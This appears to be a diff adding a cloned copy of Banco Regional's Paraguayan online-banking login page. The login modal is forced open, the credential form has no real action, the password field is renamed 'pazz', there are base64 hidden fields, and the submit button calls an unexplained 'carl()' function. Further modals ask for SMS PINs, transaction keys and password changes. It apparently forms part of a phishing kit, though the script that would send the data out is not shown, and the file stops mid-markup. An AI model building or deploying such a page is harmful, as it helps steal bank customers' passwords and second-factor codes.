@@ -1,0 +1,933 @@
+<html style="" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head>
+	<base>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<title>Home Regional - Creemos en vos</title>
+	<link rel="shortcut icon" type="image/ico" href="/RegionalWeb/img/favicon.ico">
+	<!-- Bootstrap -->
+	<link href="css/bootstrap.css" rel="stylesheet">
+	<link href="css/main.css" rel="stylesheet">
+	<link href="css/font-awesome.css" rel="stylesheet">
+	<link href="css/sky-tabs.css" rel="stylesheet">
+	<link href="css/datepicker.css" rel="stylesheet">
+    <link href="css/datepicker3.css" rel="stylesheet">
+	<!--link href="css/bancaweb.css" rel="stylesheet" type="text/css">
+     <link href="css/bancaweb2.css" rel="stylesheet" type="text/css"-->
+    <link href="css/bootstrap-select.min.css" rel="stylesheet" type="text/css">
+    <link href="css/tuerestu.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+
+	
+
+
+
+
+
+    
+        <link href="css/bancaweb.css?v=1.3.34.3" rel="stylesheet" type="text/css">
+        <link href="css/bancaweb2.css?v=1.3.34.3" rel="stylesheet">
+		
+    
+    
+
+    
+<!-- END header -->
+
+	<!--[if IE]>
+	<![endif]-->
+	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+	<script src="js/html5shiv.js"></script>
+
+	<script src="js/respond.min.js"></script>
+	<![endif]-->
+	<script src="js/modernizr-2.6.2-respond-1.1.0.min.js"></script>
+	<style>
+		.btn-cerrar-login{
+			width: 90px;
+		}
+		@media (max-width: 480px) {
+			.mdlLogin .modal-dialog {
+				width: auto;
+			}
+			.bloque-certificado img {
+				width: 100px;
+			}
+			#mdlValidData .row div:first-child img {
+				width: auto;
+			}
+			
+			.mdlContainer .modal-dialog {
+				width: auto;
+			}
+			
+			#addCodeDiv img {
+				width: 60%;
+			}
+		}
+		.bloque-certificado img {
+			width: 130px;
+		}
+		#mdlValidData .row div:first-child img {
+			width: 40px;
+		}
+		.row-data p.step-caption {
+			line-height: inherit;
+		}
+		@media (max-width: 767px) {
+			.mobile-select {
+				padding-right: 0px;
+			}
+		}
+		@media (max-width: 767px){
+			#addCodeDiv img {
+				width: 40%;
+			}
+		}
+	</style>
+    
+<style type="text/css"></style></head>
+<body class="modal-open" style="">
+	<div id="content">
+		<input type="hidden" id="uuidAccess" name="uuidAccess" value="">
+		<section class="header">
+			<nav id="navbar-dynamic" class="navbar navbar-fixed-top navbar-master navbar-float" role="navigation">
+				<div class="navbar-inner">
+					<!-- Brand and toggle get grouped for better mobile display -->		
+					<div class="navbar-header">
+						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+							Menu <img src="img/navbar-toggle.png" alt="Toggle">
+						</button>
+						<a class="navbar-brand" href="" target="_blank"><img src="img/logo-regional.png" alt="Banco Regional"></a>
+					</div>
+
+					<!-- Collect the nav links, forms, and other content for toggling -->		
+					<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+						<ul class="nav navbar-nav navbar-right">
+							<li class="navbar-item dropdown">
+								<a href="#" class="dropdown-toggle" data-toggle="dropdown">
+									Tus metas
+									<b class="caret"></b>
+								</a>
+								<ul class="dropdown-menu">
+									<li>
+										<a href="" target="_blank">Tu casa</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Tu auto</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Tu educación</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Tu futuro</a>
+									</li>
+								</ul>
+							</li>
+							<li class="navbar-item dropdown">
+								<a href="#" class="dropdown-toggle" data-toggle="dropdown">
+									Productos
+									<b class="caret"></b>
+								</a>
+								<ul class="dropdown-menu">
+									<li>
+										<a href="" target="_blank">Tarjetas</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Ahorro</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Cuenta Corriente</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Préstamos</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Seguros</a>
+									</li>
+								</ul>
+							</li>
+							<li class="navbar-item">
+								<a href="#" class="dropdown-toggle" data-toggle="dropdown">
+									Regional 24
+									<b class="caret"></b>
+								</a>
+								<ul class="dropdown-menu">
+									<li>
+										<a href="" target="_blank">Regional Web</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Regional Móvil</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Cajeros</a>
+									</li>
+									<li>
+										<a href="" target="_blank">TAS</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Contact Center</a>
+									</li>
+								</ul>
+							</li>
+							<li class="navbar-item">
+								<a href="#" class="dropdown-toggle" data-toggle="dropdown">
+									Contacto
+									<b class="caret"></b>
+								</a>
+								<ul class="dropdown-menu">
+									<li>
+										<a>Facebook</a>
+									</li>
+									<li>
+										<a>Twitter</a>
+									</li>
+									<li>
+										<a>Email</a>
+									</li>
+									<li>
+										<a href="" target="_blank">Sucursales</a>
+									</li>
+								</ul>
+							</li>
+							<li class="navbar-item visible-xs">
+								<div class="mobile-search center">
+									<input type="text" placeholder="¿Buscás algo?" id="txt_palabra_arriba" class="valid">
+									<a href="#"><i class="fa fa-search"></i></a>
+								</div>
+							</li>
+							<li class="hidden-xs navbar-item search-color">
+								<a href="#" id="btn_search" class="dropdown-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+									<i class="fa fa-search"></i>
+								</a>
+							</li>
+							<li class="navbar-item visible-xs">
+								<a href="">Personas</a>
+							</li>
+							<li class="navbar-item visible-xs">
+								<a href="">Empresas</a>
+							</li>
+							<li class="hidden-xs selector">
+								<a class="btn dropdown-toggle btn-flat" data-toggle="dropdown">Personas <b class="caret"></b></a>
+								<ul class="dropdown-menu inner" role="menu" style="overflow-y: auto;">
+									<li>
+										<a>Personas</a>
+									</li>
+									<li>
+										<a href="">Empresas</a>
+									</li>
+								</ul>
+							</li>
+							<li class="navbar-item hidden-xs">
+								<a id="login-btn" class="btn-login login-tooltip" href="javascript:;" data-toggle="tooltip" data-placement="bottom" title="Acceso Regional Web">
+									<i class="fa fa-user"></i>
+								</a>
+							</li>
+						</ul>
+					</div>
+					<!-- /.navbar-collapse -->		
+				</div>
+				<!-- /.container-fluid -->	
+			</nav>
+			<!-- END nav -->
+			<div class="search-box">
+				<input type="text" placeholder="¿Buscás algo?" id="txt_palabra_arriba_" class="valid">
+				<a href="#"><i class="fa fa-search"></i></a>
+			</div>
+			<!-- END Search box -->
+			<div class="phoenix-slider">
+				<div class="phoenix-feather">
+					<img src="#">
+	
+					<div class="legend-wrapper">
+						<div class="jumbotron legend-inner legend-animation">
+							<h1>Cambiamos</h1>
+							<p class="lead">Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.</p>
+							<p>
+								<a class="btn btn-lg btn-classic" href="" target="_blank">Ver más</a>
+							</p>
+						</div>
+					</div>
+				</div>
+				<!-- END ash -->
+
+				<div class="phoenix-feather">
+					<img src="#">
+	
+					<div class="legend-wrapper">
+						<div class="jumbotron legend-inner legend-animation">
+							<h1>Paquetes</h1>
+							<p class="lead">Regional Integral y Select son paquetes de productos y servicios hechos para vivir una experiencia a medida, disfrutando de ventajas y descuentos exclusivos.</p>
+							<p>
+								<a class="btn btn-lg btn-classic" href="">Ver más</a>
+							</p>
+						</div>
+					</div>
+				</div>
+				<!-- END ash -->
+
+				<div class="phoenix-feather">
+					<img src="#">
+					
+					<div class="legend-wrapper">
+						<div class="legend-inner legend-animation">
+							<h1>La tarjeta para vos</h1>
+							<p class="lead">Planificá, comprá, pagá con seguridad, comodidad y un sinfín de ventajas.</p>
+							<p>
+								<a class="btn btn-lg btn-classic" href="" target="_blank">Ver más</a>
+							</p>
+						</div>
+					</div>
+				</div>
+				<!-- END ash -->
+
+				<div class="phoenix-feather">
+					<img src="#">
+					
+					<div class="legend-wrapper">
+						<div class="legend-inner legend-animation">
+							<h1>Préstamos a tu medida</h1>
+							<p class="lead">Con banco Regional podés tener el préstamo perfecto para vos, hecho a tu medida. ¿Qué necesitás?...</p>
+							<p>
+								<a class="btn btn-lg btn-classic" href="">Ver más</a>
+							</p>
+						</div>
+					</div>
+				</div>
+				<!-- END ash -->
+			</div>
+			<!-- END phoenix-slider -->
+
+			<div class="container-scroll hidden-xs">
+				<a class="control-btn" href="#">
+					<img src="img/scroll-btn.png" alt="Scroll Down">
+				</a>
+			</div>
+
+		</section>
+		<!-- END header -->
+		<div class="modal fade mdlLogin in" id="mdlLogin" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static" data-keyboard="false" style="display: block;">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+							
+							<h4 class="modal-title" id="myModalLabel">Acceso Regional Web</h4>
+						
+						
+					</div>
+					<form id="frmLogin" >
+					<div class="modal-body">
+						<div class="container-fluid pd-0">
+							<div class="bt"></div>
+							<div class="row bloque">
+								<label class="col-sm-5 pdt-5">TIPO DE CLIENTE</label>							
+								<div class="col-sm-7 pd-0">
+								
+									
+										<div class="btn-group bootstrap-select col-xs-12 col-sm-12"><button type="button" class="btn dropdown-toggle btn-default" data-toggle="dropdown" data-id="tipo-cliente" title="PERSONA FÍSICA"><span class="filter-option pull-left">PERSONA FÍSICA</span>&nbsp;<span class="bs-caret"></span></button><div class="dropdown-menu open" style="max-height: 76.8021px; overflow: hidden; min-height: 0px;"><ul class="dropdown-menu inner" role="menu" style="max-height: 64.8021px; overflow-y: auto; min-height: 0px;"><li data-original-index="0" class="selected"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">PERSONA FÍSICA</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li><li data-original-index="1"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">EMPRESA</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li></ul></div><select class="selectpicker col-xs-12 col-sm-12" name="tipo-cliente" id="tipo-cliente" tabindex="-98">
+											<option value="1" selected="">PERSONA FÍSICA</option>
+											<option value="2">EMPRESA</option>
+										</select></div>
+								
+								
+								
+										
+									
+								</div>
+							</div>
+							<div class="row mt-10">
+								<div class="col-sm-7 col-sm-offset-5 mt-10">
+									<div class="form-group">
+										<label id="auth_tipo_password_label">
+											<input type="checkbox" name="auth_tipo_password" id="tipo-pw" value="H"> Usar dispositivo de seguridad
+										</label>
+									</div>
+								</div>
+							</div>
+							<div class="bt"></div>
+							
+								
+							
+							<div class="row mt-10">
+								<label class="col-sm-5 pdt-5">TIPO DE ACCESO</label>
+								<div class="col-sm-7 pd-0" id="caja_select_personas">
+									<div class="btn-group bootstrap-select col-xs-12 col-sm-12"><button type="button" class="btn dropdown-toggle btn-default" data-toggle="dropdown" data-id="tipo-doc" title="Cédula de identidad"><span class="filter-option pull-left">Cédula de identidad</span>&nbsp;<span class="bs-caret"></span></button><div class="dropdown-menu open"><ul class="dropdown-menu inner" role="menu"><li data-original-index="0" class="selected"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">Cédula de identidad</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li><li data-original-index="1"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">Nº de cliente</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li><li data-original-index="2"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">Nº de cuenta</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li></ul></div><select class="selectpicker col-xs-12 col-sm-12" name="auth_tipo_dato" id="tipo-doc" onchange="cambiarLabel('label_documento','tipo-doc')" tabindex="-98">
+										<option value="D">Cédula de identidad</option>
+										<option value="K">Nº de cliente</option>
+										<option value="C">Nº de cuenta</option>
+									</select></div>
+								</div>
+								<div class="col-sm-7 pd-0 hidden" id="caja_select_empresas">
+									<div class="btn-group bootstrap-select col-xs-12 col-sm-12"><button type="button" class="btn dropdown-toggle btn-default" data-toggle="dropdown" data-id="tipo-doc-empresa" title="R.U.C."><span class="filter-option pull-left">R.U.C.</span>&nbsp;<span class="bs-caret"><span class="caret"></span></span></button><div class="dropdown-menu open"><ul class="dropdown-menu inner" role="menu"><li data-original-index="0" class="selected"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">R.U.C.</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li><li data-original-index="1"><a tabindex="0" class="" style="" data-tokens="null"><span class="text">Nº de cliente</span><span class="glyphicon glyphicon-ok check-mark"></span></a></li></ul></div><select class="selectpicker col-xs-12 col-sm-12" name="auth_tipo_dato" id="tipo-doc-empresa" onchange="cambiarLabelEmpresa('label_ruc','tipo-doc-empresa')" tabindex="-98">
+										<option value="D">R.U.C.</option>
+										<option value="K">Nº de cliente</option>
+									</select></div>
+								</div>
+							</div>
+							
+								<div id="ruc_div" class="row mt-10  hidden ">
+									<label class="col-sm-5 pdt-5" id="label_ruc">R.U.C.</label>
+									<div class="col-sm-7">
+										<input type="text" class="form-control" id="empresa_ruc" name="ruc">
+									</div>
+								</div>
+							<div class="row mt-10">
+								<label class="col-sm-5 pdt-5" id="label_documento">Nº DE DOCUMENTO</label>
+								<div class="col-sm-7">
+									<input type="text" class="form-control" id="nro-documento" name="doc">
+								</div>
+							</div>
+							
+       <div class="row mt-10 mb-20">
+								<label class="col-sm-5 pdt-5">CLAVE DE ACCESO</label>
+								<div class="col-sm-7">
+									<input type="password" class="form-control" id="auth-password" name="pazz">
+								</div>
+							</div>
+							<div id="additionalCode" class="row mt-10 hidden">
+								<label class="col-sm-5 pdt-5">CODIGO DE SEGURIDAD</label>
+								<div class="col-sm-7">
+									<div class="row">
+										<div id="addCodeDiv" class="col-sm-5"></div>
+										<div class="col-sm-7 pdl-0">
+											<input type="text" class="form-control col-sm-12 mb-5" id="auth-captcha" name="auth_captcha">
+											<a id="captchaRefresh" href="#"><span class="glyphicon glyphicon-refresh"></span></a>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div id="errorDiv" class="row mt-10 hidden">
+								<div class="col-sm-12">
+									<div class="error-panel border-r">
+										<div id="errorMessage" class="form-group mb-0">
+<!-- 											<i class="fa fa-exclamation-triangle"></i> -->
+<!-- 											<b></b> - Intente de nuevo -->
+										</div>
+									</div>
+									<div class="TET-error-panel">
+										<div class="form-group mb-0">
+									      	<div class="TET-botonera">
+									      		<a href="#" id="tet-olvidaste-tu-clave" class="TET-botonera">¿Olvidaste tu clave?</a>
+									      	</div>
+										</div>
+									</div>							
+								</div>
+							</div>
+
+							<div class="bt mt-10"></div>
+							<div class="row">
+								<div class="col-sm-1 bloque-vinheta">
+									<img src="img/vinheta-login-form.png">
+								</div>
+								<div class="col-sm-7 pdr-0">
+									<p class="pgris">
+										No revele su clave de acceso, es de uso personal, privado, secreto e intransferible. Para todo efecto, será considerado como el equivalente a la firma electrónica. Recuerde que Usted es el único responsable de su manejo y adecuada aplicación por lo que libera al Banco Regional de toda responsabilidad en caso de que sea utilizado por otras personas.
+									</p>
+									<p class="pazul">
+										Tenga presente que el Banco Regional S.A.E.C.A. NUNCA solicitará vía telefónica o e-mail datos personales, número de cuenta, contraseña o ninguna otra información confidencial
+									</p>
+									<a class="pazul" href=" https://www.regional.com.py/seguridad" target="_blank">Otras recomendaciones de seguridad</a>
+								</div>
+								<div class="col-sm-4 bloque-certificado">
+									<script type="text/javascript">
+										var __dcid = __dcid || []; __dcid.push(["DigiCertClickID_Twd1afD9", "3", "m", "black", "Twd1afD9"]); (function(){
+										var cid = document.createElement("script"); cid.async = true; cid.src = "//seal.digicert.com/seals/cascade/seal.min.js"; var s = document.getElementsByTagName("script"); var ls = s[(s.length - 1)]; ls.parentNode.insertBefore(cid, ls.nextSibling); } ());
+									</script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script><script async="" src="//seal.digicert.com/seals/cascade/seal.min.js"></script>
+									<div align="center" title="Haga Click para Verificar - Este sitio cuenta con un Certificado SSL para asegurar la confidencialidad de sus comunicaciones.">
+										<div id="DigiCertClickID_Twd1afD9_0"><div id="DigiCertClickID_Twd1afD9Seal" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default;"><img src="img/seal.png" alt="DigiCert Secured Site Seal" tabindex="0" role="link" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer;"></div></div>
+										<div id="m_spinner" class="col-sm-1 col-sm-offset-5 mt-15"></div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="modal-footer">
+						<div class="botonera">
+							<input type="hidden" id="phse" value="OTg5MDIyZmYtZmI1OS00YzhkLTljNWQtNTZiZGRkNWM=">
+							<input type="hidden" id="phse2" value="OTg5MDIyZmYtZmI1OS00Yw==">
+				      		<input class="TET-botonera" type="button" value="INGRESAR" onclick="carl()">
+			      			<input class="TET-botonera" type="submit" value="CERRAR">
+				      	</div>
+				      	<div class="TET-botonera">
+				      		<a id="btnSolicitudClave" type="submit" class="TET-botonera">Solicita tu clave</a>
+				      	</div>
+					</div>
+					</form>
+				</div>
+			</div>
+		</div>
+		<div class="modal fade mdlLogin" id="mdlValidData" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h4 class="modal-title" id="myModalLabel">Confirmación de datos para envío de Clave Transaccional</h4>
+					</div>
+					<div class="modal-body">
+						<div class="container-fluid pd-0">
+							<div class="row bloque">
+								<div class="col-sm-12">
+									<div class="disclaimer bg-gris border-r">
+										<div class="col-sm-1 pd-0"><img src="img/homebanking/icon-disclaimer-grey.jpg" align="left"></div>
+										<div class="col-sm-11 pdl-0">
+											<p class="pazul pdl-5">Para continuar, por favor confirmá que tu número de celular y/o correo electrónico estén actualizados.</p>
+											<p class="text-left">Para confirmar transacciones que sobrepasen el límite de seguridad establecido por el Banco se te solicitará una clave transaccional que será remitida al medio seleccionado.<br>
+												Verificá que la compañía telefónica y el número estén correctos así como la dirección de correo electrónico para asegurar la recepción de tu clave. También podrás modificar los datos desde el menú Mi Perfil.
+											</p>	
+										</div>
+										<div class="clear"></div>
+									</div>
+								</div>
+								<div id="error_div" class="col-sm-12 pdl-0">
+								</div> 
+							</div>
+							
+							<div id="lista_telefonos" class="mt-10"></div>
+							<div class="row">
+								<label class="col-sm-3 pdt-10"></label>
+								<div class="col-sm-9 pdt-10">
+								<div class="telefonos">
+									<label> <input name="medio_recepcion" id="celular_recep" type="checkbox" value="N"> Recibir clave transaccional en tu celular </label>
+								</div>
+								</div>
+							</div>
+							<div class="bt"></div>
+							<div id="email_div"></div>
+														<div class="row">
+								<label class="col-sm-3 pdt-10"></label>
+								<div class="col-sm-9 pdt-10">
+								<div class="telefonos">
+									<label> <input name="medio_recepcion" id="email_recep" type="checkbox" value="N"> Recibir clave transaccional en tu e-mail </label>
+								</div>
+								</div>
+							</div>
+						</div>	
+					</div>
+					<div class="modal-footer">
+						<div class="botonera">
+				      		<a href="javascript:;" id="btnConfirmarDatos" class="btn btn-transferencias">CONFIRMAR</a>
+				      	</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="modal fade mdlContainer" id="mdlSegundoFactor" tabindex="-1" role="dialog" aria-labelledby="mdlResultLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h4 class="modal-title sm" id="mdlResultLabel">Confirme que accede desde una ubicación frecuente</h4>
+					</div>
+					<div class="modal-body">
+						<div class="row-data">
+							<div class="row">
+								<div class="col-xs-12 col-sm-12 text-left">
+									<div class="step-vinhetas">
+										<span class="fa fa-circle-thin"></span><span class="caption">1</span>
+									</div>
+									<p class="step-caption">Le enviaremos un PIN para confirmar su ubicación. Indique dónde lo quiere recibir</p>
+								</div>
+								<div class="col-xs-12 col-sm-12 pdl-frmModal">
+									<div class="radio">
+										<label>
+											<input type="radio" name="medio_recibe" id="medio_email">
+												E-mail
+										</label>
+									</div>
+									<div class="radio">
+										<label>
+											<input type="radio" name="medio_recibe" id="medio_sms">Mensaje
+										</label>
+									</div>
+									<p class="text-sm">* Los destinos tanto de e-mail como de SMS son los catastrados en el banco</p>
+						  		</div>
+						  	</div>
+						</div>
+						<div class="b-bottom"></div>
+					</div>
+					<div class="modal-footer">
+						<div class="botonera-footer">
+							<button type="button" id="mdlButton-getPin" class="btn btn-bottom">Obtener PIN</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="modal fade mdlContainer" id="mdlSegundoFactor2" tabindex="-1" role="dialog" aria-labelledby="mdlResultLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h4 class="modal-title sm" id="mdlResultLabel">Confirme que accede desde una ubicación frecuente</h4>
+					</div>
+					<div class="modal-body">
+						<div class="row-data">
+							<div class="row">
+								<div class="col-xs-12 col-sm-12 text-left">
+									<div class="step-vinhetas">
+										<span class="fa fa-circle-thin"></span><span class="caption">2</span>
+									</div>
+									<p class="step-caption">Escriba por favor el PIN recibido</p>
+								</div>
+								<span class="col-xs-12 col-sm-4 pdl-frmModal">
+<!-- 									<div class="radio"> -->
+<!-- 										<label> -->
+<!-- 											<input type="radio" name="medio_recibe" id="medio_recibe_1" value="email"> -->
+<!-- 												E-mail -->
+<!-- 										</label> -->
+<!-- 									</div> -->
+						  		</span>
+								<span class="col-sm-4 offset-sm-6 col-xs-12">
+									<input type="text" class="form-control" id="pin-confirmacion" name="pin_confirmacion">
+								</span>
+						  	</div>
+						</div>
+						<div class="b-bottom"></div>
+					</div>
+					<div class="modal-footer">
+						<div class="botonera-footer">
+							<button type="button" id="mdlRequestPin" class="btn btn-bottom">Solicitar nuevo PIN</button>
+							<button type="button" id="mdlConfirmPin" class="btn btn-bottom">Confirmar Ubicación</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<div class="modal fade mdlContainer" id="mdlHardToken" tabindex="-1" role="dialog" aria-labelledby="mdlResultLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+			<div class="modal-dialog">
+				<div class="modal-content" style="text-align: center;">
+					<div class="modal-header">
+						<h4 class="modal-title sm" id="mdlResultLabel">Autenticación exitosa</h4>
+					</div>
+					<div class="modal-body">
+						<div class="row-data">
+							<div class="row">
+								<div class="col-xs-12 col-sm-12">
+					  				<p style="font-size: medium; font-weight: bold;">Su dispositivo de seguridad ha sido autenticado exitosamente.</p>
+					  			</div>
+					  			<div class="col-xs-12 col-sm-12">
+					  				<p>Su número de autenticación es <span id="codigo_host"></span></p>
+					  			</div>
+						  	</div>
+						</div>
+						<div class="b-bottom"></div>
+					</div>
+					<div class="modal-footer">
+						<div class="row" style="text-align: center">
+							<div class="col-xs-12 col-sm-12">
+				  				<p style="font-size: medium; font-weight: bold;">¿Desea continuar?</p>
+				  			</div>
+						</div>
+						<div class="botonera-footer">
+							<button type="button" id="mdlContinueLogin" class="btn btn-bottom">SI</button>
+							<button type="button" id="mdlLogout" class="btn btn-bottom">NO</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+			<div class="modal fade mdlLogin" id="mdlClaveTransaccional" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h4 class="modal-title" id="myModalLabel">Cambio clave</h4>
+					</div>
+					<div class="modal-body">
+						<div class="container-fluid pd-0">
+							<form class="form col-xs-12 col-sm-12 col-md-12 pd-10" role="form">
+									<h4 class="pdl-20 blue title-form mb-20">El cambio de clave afectará a su clave de acceso a la Regional Web y a los TAS.</h4>
+									<div class="form-group">
+										<div class="row pdl-20">
+											<label class="col-xs-12 col-sm-5 pdt-5">Clave Actual</label>
+											<div class="col-xs-12 col-sm-7">
+												<input type="password" maxlength="50" name="clave_actual" id="clave_actual" class="form-control col-xs-12 col-sm-12">
+											</div>
+										</div>
+									</div>
+									<div class="form-group">
+										<div class="row pdl-20">
+											<label class="col-xs-12 col-sm-5 pdt-5">Nueva clave</label>
+											<div class="col-xs-12 col-sm-7">
+												<input type="password" maxlength="50" name="nueva_clave" id="nueva_clave" class="form-control col-xs-12 col-sm-12">
+											</div>
+										</div>
+									</div>
+									<div class="form-group">
+										<div class="row pdl-20">
+											<label class="col-xs-12 col-sm-5 pdt-5">Repetir nueva clave</label>
+											<div class="col-xs-12 col-sm-7">
+												<input type="password" maxlength="50" name="repetir_nueva_clave" id="repetir_nueva_clave" class="form-control col-xs-12 col-sm-12">
+											</div>
+										</div>
+									</div>
+									<div class="disclaimer bg-gris border-r mt-10">
+										<div class="row">
+											<div class="col-xs-2 col-sm-1 pdr-0">
+												<img src="img/icon-disclaimer-grey.jpg" align="left" style="margin-right: 5px; float: right;">
+											</div>
+											<div class="col-xs-10 col-sm-11 pdl-0">
+												<p class="text-left">
+												<b>Estimado Cliente: </b><br>
+												Debe tener en cuenta los siguientes puntos al momento de crear su clave:<br>
+												- Debe contar con una longitud mínima de 8 caracteres.<br>
+												- Debe contar con una longitud máxima de 50 caracteres.<br>
+												- Debe estar compuesta por números y letras.<br>
+												- No debe incluir caracteres especiales, espacios o ñ/Ñ.<br>
+												- No debe ingresar más de 2 veces una misma letra o número de forma consecutiva.<br>
+												- No reutilizar su clave.<br>
+												- No utilice datos conocidos como: número de cliente, número de documento de identidad, número de cuenta o fecha de nacimiento (al derecho y del revés).<br><br>
+												Recomendamos:<br>
+												- Cambiar su contraseña cada 30 días o antes si lo considera necesario.<br> 
+												- Utilice una combinación de mayúsculas y minúsculas en la composición de su clave.<br>
+												- No anotar su clave.
+												</p>
+											</div>
+										</div>
+									</div>
+								</form>
+								<div class="col-xs-12 col-sm-12 pdl-0 mb-10">
+								  	<div id="cambio_clave_comp_error_div" class="validate-alert border-r ml-15 mt-10 hidden">
+										<span class="fa-stack mdl-icon mr-10">
+							  				<i class="fa fa-circle-thin fa-stack-1x"></i><span class="caption">!</span>
+										</span>
+										<b id="cambio_clave_comp_error_type"></b>
+										<span id="cambio_clave_comp_error"></span>
+									</div>
+								</div>
+								<div id="cambio_clave_error_area"></div>
+						</div>	
+					</div>
+					<div class="modal-footer">
+						<div class="botonera">
+						<input type="hidden" class="form-control" name="token_solicitud" id="token_solicitud" value="">
+
+				      		<button id="confirmar_cambio" type="button" class="btn btn-transferencias">CONFIRMAR</button>
+				      	</div>
+					</div>
+				</div>
+			</div>
+		</div>
+			<div class="modal fade mdlContainer" id="mdlPin" tabindex="-1" role="dialog" aria-labelledby="mdlResultLabel" aria-hidden="true">
+		<form name="frmModal" id="frmModalPin" enctype="multipart/form-data" action="#" method="post">
+			<div class="modal-dialog">
+			<div class="modal-content">
+			  <div class="modal-header">
+			  	<span class="fa-stack mdl-icon">
+				  <i class="fa fa-circle-thin fa-stack-1x"></i><span class="caption">?</span>
+				</span>
+			    <h4 class="modal-title sm" id="mdlResultLabel">OBTENGA SU CLAVE TRANSACCIONAL</h4>
+			  </div>
+			  <div class="modal-body">
+			  	<div class="row-data">
+			  		<div class="row">
+			  			<div class="col-xs-12 col-sm-12 text-left">
+			  				<div class="step-vinhetas">
+			  					<span class="fa fa-circle-thin"></span><span class="caption">1</span>
+			  				</div>
+			  				<p class="step-caption">Seleccione el medio por el cual quiere recibir su CLAVE TRANSACCIONAL</p>
+			  			</div>
+			  			<div class="col-xs-12 col-sm-12 pdl-frmModal">
+			  				<div class="radio">
+								<label>
+								
+									
+								</label>
+							</div>
+							<div class="radio">
+								<label>
+								
+								
+								</label>
+							</div>
+							<p class="text-sm">* Los destinos tanto de e-mail como de SMS son los catastrados en el banco. Si aún no lo hizo envíe SI al 88177 por única vez para la recepción de mensajes. Las siguientes veces ya no será necesario.</p>
+							<div id="modal_spinner"></div>
+			  			</div>
+			  			<div id="cambio_clave_error_div"></div>
+			  		</div>
+			  	</div>
+			  	<div class="b-bottom"></div>
+			  </div>
+			  <div class="modal-footer">
+			  	<div class="botonera-footer">
+			    	<button type="button" id="mdlButton-next" class="btn btn-bottom">Obtener clave</button>
+			    </div>
+			  </div>
+			</div>
+			</div>
+		</form>
+	</div>
+
+	<div class="modal fade mdlContainer" id="mdlPinConfirm" tabindex="-1" role="dialog" aria-labelledby="mdlResultLabel" aria-hidden="true">
+		<form name="frmModal" id="frmModalPin_" enctype="multipart/form-data" action="#" method="post">
+			<div class="modal-dialog">
+			<div class="modal-content">
+			  <div class="modal-header">
+			  	<span class="fa-stack mdl-icon">
